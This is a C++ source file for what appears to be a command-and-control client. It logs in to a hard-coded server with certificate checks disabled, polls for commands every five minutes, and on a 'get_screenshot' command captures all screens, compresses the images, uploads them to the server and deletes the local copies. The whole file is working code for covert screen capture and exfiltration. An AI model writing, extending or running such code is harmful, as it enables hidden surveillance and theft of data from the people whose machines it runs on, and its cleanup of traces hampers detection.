#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <cstdio>
#include <thread>
#include <curl/curl.h>
#include "zlib.h"
#include "ScreenCapture.h"
#include "FileUtils.h" 

struct CommandInfo {
    std::string command;
    std::string uuid;
};

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append(reinterpret_cast<const char*>(contents), totalSize);
    return totalSize;
}

std::string extractCsrfToken(const std::string& htmlContent) {
    std::regex regexPattern("<input type=\"hidden\" name=\"csrf_token\" value=\"([^\"]*)\">");
    std::smatch match;

    if (std::regex_search(htmlContent, match, regexPattern)) {
        return match[1].str();
    }

    return "";
}

CommandInfo extractCommandAndUuidFromJson(const std::string& jsonResponse) {
    CommandInfo commandInfo;
    
    std::regex commandRegex("\"command_executed\":\"([^\"]+)\"");
    std::regex uuidRegex("\"uuid\":\"([a-f0-9-]+)\"");
    
    std::smatch commandMatch;
    std::smatch uuidMatch;

    if (std::regex_search(jsonResponse, commandMatch, commandRegex)) {
        commandInfo.command = commandMatch[1].str();
    }

    if (std::regex_search(jsonResponse, uuidMatch, uuidRegex)) {
        commandInfo.uuid = uuidMatch[1].str();
    }

    return commandInfo;
}

int main() {
    const char* loginUrl = "https://16.16.16.114:5000/login";
    const char* commandsUrl = "https://16.16.16.114:5000/get_commands";
    const char* uploadUrl = "https://16.16.16.114:5000/upload";

    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        std::string cookies;
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, ""); 
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        std::string htmlContent;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (CSRF token retrieval): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            return 1;
        }

        std::string csrfToken = extractCsrfToken(htmlContent);
        if (csrfToken.empty()) {
            std::cerr << "Unable to find CSRF token in HTML response." << std::endl;
            curl_easy_cleanup(curl);
            return 1;
        }

        std::cout << "CSRF Token: " << csrfToken << std::endl;
        curl_easy_reset(curl);
        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
        std::string postFields = "username=client&password=client&secret=client&csrf_token=" + csrfToken;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "cURL Error (login): " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            return 1;
        }

        while (true) {  // Infinite loop to periodically check for new commands
            // Access the /get_commands page after login
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_URL, commandsUrl);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
            htmlContent.clear();
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                std::cerr << "cURL Error (access to /get_commands): " << curl_easy_strerror(res) << std::endl;
            } else {
                std::cout << "Access to /get_commands successful!" << std::endl;
                std::cout << "Content of /get_commands page: " << std::endl;
                std::cout << htmlContent << std::endl;

                // Check if the command is "get_screenshot"
                CommandInfo commandInfo = extractCommandAndUuidFromJson(htmlContent);
                if (commandInfo.command == "get_screenshot") {
                    // Display the command and UUID
                    std::cout << "Extracted Command: " << commandInfo.command << std::endl;
                    std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;

                    // Use the screen capture feature
                    ScreenCapture screenCapture;
                    screenCapture.CaptureScreensAndSave();
                    std::cout << "Screen capture completed!" << std::endl;

                    const char* outputArchiveNamePatternBMP = "*.bmp";
                    std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);

                    deleteFiles(outputArchiveNamePatternBMP);

                    // Display the path of the compressed archive
                    std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;

                    // Prepare to send the file lol.bmp
                    curl_easy_reset(curl);
                    curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
                    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
                    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
                    curl_easy_setopt(curl, CURLOPT_POST, 1L);

                    curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);

                    struct curl_httppost* post = nullptr;
                    struct curl_httppost* last = nullptr;

                    // Add the file field
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath.c_str(), CURLFORM_END);

                    // Add other fields (command, extra, uuid, csrf_token)
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, "", CURLFORM_END); // Add the appropriate value for "extra" if necessary
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);

                    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

                    // Execute the request
                    CURLcode res = curl_easy_perform(curl);

                    // Free the memory used by the form
                    curl_formfree(post);

                    if (res != CURLE_OK) {
                        std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
                    } else {
                        std::cout << "File uploaded successfully!" << std::endl;

                        // Delete the archive after successful upload
                        if (remove(compressedArchivePath.c_str()) == 0) {
                            std::cout << "Archive deleted successfully!" << std::endl;
                        } else {
                            std::cerr << "Error deleting archive!" << std::endl;
                        }
                    }
                }
            }

            // Wait for 5 minutes before the next check
            std::this_thread::sleep_for(std::chrono::minutes(5));
        }

        curl_easy_cleanup(curl);
        return 0;
    }
}
